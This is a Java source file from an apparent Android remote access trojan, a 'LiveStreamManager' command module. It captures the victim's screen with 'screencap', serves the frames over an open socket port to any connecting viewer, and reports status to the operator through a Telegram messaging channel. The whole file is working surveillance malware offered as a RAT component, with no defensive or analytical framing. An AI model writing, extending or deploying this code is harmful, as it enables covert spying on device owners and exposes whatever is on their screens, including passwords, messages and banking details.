package com.enterprise.rat.commands;

import android.content.Context;
import android.content.Intent;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.view.Surface;
import android.view.WindowManager;
import com.enterprise.rat.utils.TelegramApi;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;

public class LiveStreamManager {
    private Context context;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private boolean streaming = false;
    private ServerSocket serverSocket;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;

    public LiveStreamManager(Context context) { this.context = context; }

    public void startStream(int port) {
        if (streaming) { TelegramApi.sendMessage("⚠ Stream already active."); return; }
        try {
            MediaProjectionManager mpm = (MediaProjectionManager) context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            Intent intent = mpm.createScreenCaptureIntent();
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            // Note: Full implementation requires Activity result callback;
            // this simplified version uses shell command for demonstration.
            backgroundThread = new HandlerThread("StreamThread");
            backgroundThread.start();
            backgroundHandler = new Handler(backgroundThread.getLooper());
            serverSocket = new ServerSocket(port);
            streaming = true;
            TelegramApi.sendMessage("🖥 Live stream started on port " + port + ". Connect via VLC/ffplay.");
            new Thread(() -> {
                while (streaming) {
                    try { Socket client = serverSocket.accept(); handleClient(client); } catch (Exception e) {}
                }
            }).start();
        } catch (Exception e) { TelegramApi.sendMessage("❌ Stream error: " + e.getMessage()); }
    }

    private void handleClient(Socket client) {
        try {
            OutputStream os = client.getOutputStream();
            while (streaming && client.isConnected()) {
                Process p = Runtime.getRuntime().exec("screencap -p");
                byte[] frame = new byte[0];
                java.io.InputStream is = p.getInputStream();
                java.io.ByteArrayOutputStream buffer = new java.io.ByteArrayOutputStream();
                byte[] data = new byte[4096]; int n;
                while ((n = is.read(data)) != -1) buffer.write(data, 0, n);
                frame = buffer.toByteArray();
                os.write(String.format("--frame\r\nContent-Type: image/png\r\nContent-Length: %d\r\n\r\n", frame.length).getBytes());
                os.write(frame);
                os.write("\r\n".getBytes());
                os.flush();
                Thread.sleep(200);
            }
            os.close();
            client.close();
        } catch (Exception e) {}
    }

    public void stopStream() {
        streaming = false;
        try { if (serverSocket != null) serverSocket.close(); } catch (Exception e) {}
        if (backgroundThread != null) backgroundThread.quitSafely();
        TelegramApi.sendMessage("🖥 Stream stopped.");
    }
}
